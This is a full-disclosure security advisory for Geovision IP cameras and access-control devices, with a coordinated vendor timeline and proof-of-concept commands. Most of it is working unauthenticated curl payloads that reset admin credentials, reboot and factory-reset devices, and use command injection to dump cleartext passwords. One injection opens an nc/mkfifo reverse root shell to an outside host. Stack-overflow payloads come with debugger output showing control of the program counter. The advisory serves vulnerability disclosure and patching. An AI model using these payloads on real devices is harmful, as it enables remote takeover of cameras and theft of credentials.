[STX]

Subject: Geovision Inc. IP Camera/Video/Access Control Multiple Remote Command Execution - Multiple Stack Overflow - Double free - Unauthorized Access

Attack vector: Remote
Authentication: Anonymous (no credentials needed)
Researcher: bashis <mcw noemail eu> (November 2017)
PoC: https://github.com/mcw0/PoC
Python PoC: https://github.com/mcw0/PoC/blob/master/Geovision-PoC.py
Release date: February 1, 2018
Full Disclosure: 90 days

Vendor URL: http://www.geovision.com.tw/
Updated FW: http://www.geovision.com.tw/download/product/

heap: Executable + Non-ASLR
stack: Executable + ASLR

Vulnerable:
Practically more or less all models and versions with FW before November/December 2017 of Geovision embedded IP devices suffer from one or more of these vulnerabilities.

Verified:
GV-BX1500 v3.10 2016-12-02
GV-MFD1501 v3.12 2017-06-19

Timeline:
November 5, 2017: Initiated contact with Geovision
November 6, 2017: Response from Geovision
November 8, 2017: Informed Geovision about quite dangerous bug in 'FilterSetting.cgi'
November 8, 2017: Responce from Geovision
November 15, 2017: Reached out to Geovision to offer more time until FD
                   (due to the easy exploiting and number of vulnerabilities in large number of products)
November 17, 2017: Request from Geovision to have time to end of January 2018
November 18, 2017: Agreed to FD date of February 1, 2018
November 20, 2017: Received one image for test purposes
November 26, 2017: ACK to Geovision that image looks good
January 16, 2018: Sent this FD and PoC Python to Geovision for comments before FD, if any objections.
January 17, 2018: Received all OK from Geovision, no objections, toghether with thanks for the effort for trying to make Geovision products more safe.
January 17, 2018: Thanked Geoviosion for good cooperation.
February 1, 2018: Full disclosure


-[Unathorized Access]-

1)
PoC: Reset and change 'admin' to 'root' with passwd 'PWN' (GV-MFD1501 v3.12 2017-06-19)
curl -v http://192.168.57.20:80/UserCreat.cgi?admin_username=root\&admin_passwordNew=PWN

2)
PoC: Change device WebGUI language back to default
curl -v -X POST http://192.168.57.20:80/LangSetting.cgi -d lang_type=0\&submit=Apply

3)
Unathorized upgrade of firmware.
PoC: Reboot the remote device as in 'run_upgrade_prepare'
curl -v "http://192.168.57.20:80/geo-cgi/sdk_fw_update.cgi"
URI: http://192.168.57.20/ssi.cgi/FirmwareUpdate.htm

4)
PoC: Upload of Firmware header for checking correct firmware.
curl -v -X PUT "http://192.168.57.20:80/geo-cgi/sdk_fw_check.cgi" -d "BAAAALAAAAABAgAAAAAAADKvfBIAAAABGDIpBwAAAABhc19jcmZpZAAAAAAAAAAALgYAALAAAADXe///AAAAAAAAAABib290bG9hZGVyLmJpbgAAAAA0ALAAAgBOAP//AAAAAAAAAAB1SW1hZ2UAAAAAAAAAAAAA1OIaALAANgDSw///AAAAAAAAAAByYW1kaXNrLmd6AAAAAAAAALBtArAAUgAIuf//AAAAAAAAAAAjIFN0YXJpbmcgd2l0aCAnSElEOicgYW5kIHNwbGl0IGJ5ICcsJyBhbmQgZW5kIHdpdGggJ1xyXG4nICgweDBkIDB4MGEpDQpISUQ6MTE3MCxOYW1lOkdWLUxQQzIyMTAsRG93blZlcjoxMDINCkhJRDoxMTUwLE5hbWU6R1YtUFBUWjczMDBfU0QsRG93blZlcjozMDUNCkhJRDoxMTUyLE5hbWU6R1YtUFBUWjczMDBfRkUsRG93blZlcjozMDUNCkhJRDoxMTc2LE5hbWU6R1YtQlgzNDAwRSxEb3duVmVyOjMwMw0KSElEOjExNzUsTmFtZTpHVi1CWDE1MDBFLERvd25WZXI6MzAzDQpISUQ6MTEwMSxOYW1lOkdWLVVORkUyNTAzLERvd25WZXI6MzA2DQpISUQ6MTE0NSxOYW1lOkdWLVVOMjYwMCxEb3c="

/var/log/messages
192.168.57.1 - - [01/Jan/1970:00:32:43 +0000] "PUT /geo-cgi/sdk_fw_check.cgi HTTP/1.1" 200 25000 "" "curl/7.38.0"
Nov  5 17:11:51 thttpd[1576]: (1576) cgi[3734]: Spawned CGI process 1802 to run 'geo-cgi/sdk_fw_check.cgi', query[]
Nov  5 17:11:51 sdk_fw_check.cgi: CONTENT_LENGTH = 684
Nov  5 17:11:51 sdk_fw_check.cgi: (1802) main[183]: base64 encode length : 684
Nov  5 17:11:51 sdk_fw_check.cgi: (1802) main[184]: base64 encode output : BAAAALAAAAABAgAAAAAAADKvfBIAAAABGDIpBwAAAABhc19jcmZpZAAAAAAAAAAALgYAALAAAADXe///AAAAAAAAAABib290bG9hZGVyLmJpbgAAAAA0ALAAAgBOAP//AAAAAAAAAAB1SW1hZ2UAAAAAAAAAAAAA1OIaALAANgDSw///AAAAAAAAAAByYW1kaXNrLmd6AAAAAAAAALBtArAAUgAIuf//AAAAAAAAAAAjIFN0YXJpbmcgd2l0aCAnSElEOicgYW5kIHNwbGl0IGJ5ICcsJyBhbmQgZW5kIHdpdGggJ1xyXG4nICgweDBkIDB4MGEpDQpISUQ6MTE3MCxOYW1lOkdWLUxQQzIyMTAsRG93blZlcjoxMDINCkhJRDoxMTUwLE5hbWU6R1YtUFBUWjczMDBfU0QsRG93blZlcjozMDUNCkhJRDoxMTUyLE5hbWU6R1YtUFBUWjczMDBfRkUsRG93blZlcjoz
Nov  5 17:11:51 sdk_fw_check.cgi: (1802) main[185]: decode length        : 512
Nov  5 17:11:51 sdk_fw_check.cgi: (1802) main[186]: decode output        : ^D
Nov  5 17:11:51 sdk_fw_check.cgi: (1802) check_image_format_is_OK[839]: (1) Product Error: Image's magic[513] != DEV_MAGIC[1000]
Nov  5 17:11:51 sdk_fw_check.cgi: (1802) check_firmware[135]: ERROR : check firmware, length [512]

5)
Unathorized access of 'sdk_config_set.cgi' to Import Setting (SDK_CONFIG_SET) 
curl -v -X PUT "http://192.168.57.20:80/geo-cgi/sdk_config_set.cgi"

6)
/PSIA/
Access to GET (read) and PUT (write)
curl -v -X PUT http://192.168.57.20:80/PSIA/System/reboot
curl -v -X PUT http://192.168.57.20:80/PSIA/System/updateFirmware
curl -v -X PUT http://192.168.57.20:80/PSIA/System/factoryReset
[...]
List: /PSIA/System/reboot/index
Usage: /PSIA/System/reboot/description
PoC: curl -v -X PUT http://192.168.57.20:80/PSIA/System/reboot
Full recursive list: /PSIA/indexr


-[Remote Command Execution]-

7)
PoC will create 'tmp/Login.cgi' with '<!--#include file="SYS_CFG"-->', then Dump All Settings,
including login and passwords in clear text by accessing the created Login.htm

curl -v "http://192.168.57.20:80/PictureCatch.cgi?username=GEOVISION&password=%3becho%20%22%3c%21--%23include%20file=%22SYS_CFG%22--%3e%22%3etmp/Login.htm%3b&data_type=1&attachment=1&channel=1&secret=1&key=PWNED" ; curl -v "http://192.168.57.20:80/ssi.cgi/tmp/Login.htm"

< HTTP/1.1 200 OK
...
-------------------------------------
-                                   -
-         Dump All Settings         -
-                                   -
-------------------------------------
...


8)
PoC will pop reverse connect back shell to 192.168.57.1

/www/PictureCatch.cgi
curl -v "http://192.168.57.20:80/PictureCatch.cgi?username=GEOVISION\&password=%3bmkfifo%20/tmp/s0%3bnc%20-w%205%20192.168.57.1%201337</tmp/s0|/bin/sh>/tmp/s0%202>/tmp/s0%3brm%20/tmp/s0%3b\&data_type=1\&attachment=1\&channel=1\&secret=1\&key=PWNED"

$ ncat -vlp 1337
Ncat: Version 7.12 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 192.168.57.20.
Ncat: Connection from 192.168.57.20:55331.
pwd
/www
id
uid=0(root) gid=0(root)
exit
$

9)
/www/JpegStream.cgi
curl -v "http://192.168.57.20:80/JpegStream.cgi?username=GEOVISION\&password=%3bmkfifo%20/tmp/s0%3bnc%20-w%205%20192.168.57.1%201337</tmp/s0|/bin/sh>/tmp/s0%202>/tmp/s0%3brm%20/tmp/s0%3b\&data_type=1\&attachment=1\&channel=1\&secret=1\&key=PWNED"

$ ncat -vlp 1337
Ncat: Version 7.12 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 192.168.57.20.
Ncat: Connection from 192.168.57.20:55332.
pwd
/www
id
uid=0(root) gid=0(root)
exit
$

Problem(s):
SIiUTIL_GetDecryptData calling popen() "sh -c /var/www/testbf d PWNED ;mkfifo /tmp/s0;..." without proper sanitation of user input

Note: 
Vulnerable tags: 'username', 'password' and 'key'


-[Double free]-

10)
curl -v http://192.168.57.20:80/PSIA/System/configurationData
*** glibc detected *** psia.cgi: double free or corruption (out): 0x00077d10 ***

-[Stack Overflow]-

11)
/usr/local/thttpd
curl -v "http://192.168.57.20:80/htpasswd?password=`for((i=0;i<140;i++));do echo -en "X";done`AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII"

Program received signal SIGSEGV, Segmentation fault.
0x49494948 in ?? ()
(gdb) bt
#0  0x49494948 in ?? ()
#1  0x0003889c in ?? ()
Backtrace stopped: previous frame identical to this frame (corrupt stack?)
(gdb) i reg
r0             0x0	0
r1             0x369650	3577424
r2             0x1	1
r3             0x68	104
r4             0x41414141	1094795585
r5             0x42424242	1111638594
r6             0x43434343	1128481603
r7             0x44444444	1145324612
r8             0x45454545	1162167621
r9             0x46464646	1179010630
r10            0x47474747	1195853639
r11            0x48484848	1212696648
r12            0x3680e8	3571944
sp             0x7ee0fbc8	0x7ee0fbc8
lr             0x3889c	231580
pc             0x49494948	0x49494948
cpsr           0x20000030	536870960
(gdb)

12)
/usr/local/thttpd
curl -v http://192.168.57.20:80/geo-cgi/param.cgi?skey=`for((i=0;i<44;i++)); do echo -en "X"; done`AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN

Program received signal SIGSEGV, Segmentation fault.
0x49494948 in ?? ()
(gdb) bt
#0  0x49494948 in ?? ()
#1  0x3e4c4d54 in ?? ()
Backtrace stopped: previous frame identical to this frame (corrupt stack?)
(gdb) i reg
r0             0xffffffff	4294967295
r1             0x7e963e8c	2123775628
r2             0x0	0
r3             0x242	578
r4             0x41414141	1094795585
r5             0x42424242	1111638594
r6             0x43434343	1128481603
r7             0x44444444	1145324612
r8             0x45454545	1162167621
r9             0x46464646	1179010630
r10            0x47474747	1195853639
r11            0x48484848	1212696648
r12            0xa	10
sp             0x7e983c48	0x7e983c48
lr             0x3e4c4d54	1045187924
pc             0x49494948	0x49494948
cpsr           0x60000030	1610612784
(gdb)

13)
/www/PictureCatch.cgi
curl -v "http://192.168.57.20:80/PictureCatch.cgi?username=`for((i=0;i<324;i++));do echo -en "A";done`BBBB&password=GEOVISION&data_type=1&attachment=1&channel=1&secret=1&key=PWNED"

[pid  2215] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---

14)
/www/Login3gpp.cgi
curl -v "http://192.168.57.20:80/Login3gpp.cgi?username=`for((i=0;i<444;i++));do echo -en "A";done`BBBB&password=PWNED"

[pid  2161] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424243} ---

15)
/www/Login.cgi
curl -v "http://192.168.57.20:80/Login.cgi?username=`for((i=0;i<477;i++));do echo -en "A";done`BBBB&password=PWNED"

[pid  2135] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---

Note: username and password uses strcpy() and both are vulnerable.
However, 'password' cannot be used remotely since 'thttpd' checking for this, and is vulnerable for stack overflow.

Have a nice day
/bashis

[ETX]